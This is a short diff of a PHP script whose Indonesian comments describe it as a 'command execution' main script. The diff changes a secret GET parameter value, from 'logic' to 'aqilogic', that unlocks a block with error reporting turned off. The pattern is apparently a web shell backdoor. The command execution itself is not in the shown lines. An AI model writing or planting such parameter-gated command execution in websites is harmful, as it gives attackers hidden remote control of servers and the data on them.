@@ -1,6 +1,6 @@
 <?php
 // Script Utama - hanya command execution
-if(isset($_GET['call']) && $_GET['call'] === 'logic') {
+if(isset($_GET['call']) && $_GET['call'] === 'aqilogic') {
     
     // TAMBAHAN 2: Command Execution
     error_reporting(0);
